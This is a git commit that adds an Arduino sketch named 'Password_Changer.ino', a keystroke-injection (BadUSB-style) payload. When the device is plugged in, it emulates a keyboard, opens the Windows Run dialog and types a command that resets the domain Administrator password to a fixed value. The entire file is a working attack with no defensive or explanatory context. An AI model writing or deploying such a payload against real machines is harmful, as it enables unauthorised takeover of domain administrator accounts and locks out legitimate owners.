0e729fbeac31aabf46e2d7023834fcd0307eff16
mohsen akhavan <77884120+mohsenakhavan@users.noreply.github.com>
2025-02-08 23:10:03 +0330

    Create Password_Changer.ino

---
+++ sketches/Password_Changer.ino
@@ -0,0 +1,15 @@
+#include <USBHIDKeyboard.h>
+USBHIDKeyboard Keyboard;
+
+void setup() {
+  Keyboard.begin();
+  delay(3000);
+  
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.println(F("cmd /c net user Administrator NewPass123! /domain"));
+}
+
+void loop() {}
